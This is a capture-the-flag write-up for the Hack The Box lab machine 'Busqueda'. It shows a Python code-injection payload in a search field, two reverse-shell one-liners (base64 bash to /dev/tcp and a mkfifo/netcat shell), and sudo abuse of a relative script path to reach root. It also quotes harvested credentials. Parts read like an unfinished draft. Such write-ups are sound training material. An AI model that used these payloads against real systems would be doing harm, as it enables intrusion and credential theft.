
### Foothold

I run nmap and find there is an open http port on `80`

```
nmap -sV -sC 10.129.109.237

...

80/tcp open  http    Apache httpd 2.4.52
```

When I visit the website, I am redirected to the domain `searcher.htb`

I add this domain to the hosts file:

```
  echo "10.10.11.208  searcher.htb" | sudo tee -a /etc/hosts
```


# Add more details here...

There is a search box on the website, I enter the following text and get the response....

```
  ') + str(__import__('os').system('id')) #
...
uid=1000(svc) gid=1000(svc) groups=1000(svc) https://www.accuweather.com/en/search-locations?query=0
```

I run a local netcat listener:

```
nc -nvlp 1337
```

I send a base64 encoded reverse shell payload in the query parameter:

```
')+ str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MS8xMzM3IDA+JjE=|base64 -d|bash'))#
```

This connects to the netcat listener:

```
$ nc -nvlp 1337

listening on [any] 1337 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.109.237] 56362
bash: cannot set terminal process group (1494): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ ls
```

I get the user flag:

```
svc@busqueda:/var/www/app$ cat /home/svc/user.txt
cat /home/svc/user.txt
ebae8d32f7a95db33c71fce81ea95215
```

### PrivEsc

`.git/config` file has a reference to `gitea.searcher.htb` subdomain

```
svc@busqueda:/var/www/app$ cat /var/www/app/.git/config
cat /var/www/app/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

We get the password: `jh1usoih2bkjaspwe92`

I login to `ssh svc@10.10.11.208` with the above password. 

I add the `gitea` subdomain:

```
echo "10.10.11.208 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

What are the files where we have root rights?

```
svc@busqueda:~$ sudo -l
...
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
```

I use `jq` to parse the json:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
...
"Env": [

      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"

],
```

I get the password `yuiu1hoiu4i5ho1uh`

I can now login to the gitea.searcher.htb/administrator/scripts website with the password above, with the username `administrator`.


# Does all this make sense?

I inspect the system-checkup.py file since we have the ability to execute the /opt/scripts/system-checkup.py file with root privileges on the remote host. During our analysis of the code, we uncover that the full-checkup argument, which we haven't examined yet, executes a bash script named full-checkup.sh .

The system-checkup.py is executed successfully when ran from the /opt/scripts/ directory where the full-checkup.sh file is present.

I run the following commands on the `svc` user:

```
cd /opt/scripts/
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

So, let's create a file /tmp/full-checkup.sh and insert a reverse shell payload into it.

```
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f" > /tmp/full-checkup.sh

chmod +x /tmp/full-checkup.sh
```

I start a netcat listener on my local `nc -nvlp 9001`

Finally, we run the following command on the remote host from the /tmp directory to trigger the reverse shell.

```
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

The root flag can be obtained at /root/root.txt

```
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.109.237] 37132
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
5e32e971baae4d9c18dee05b1fa9bd5b
```


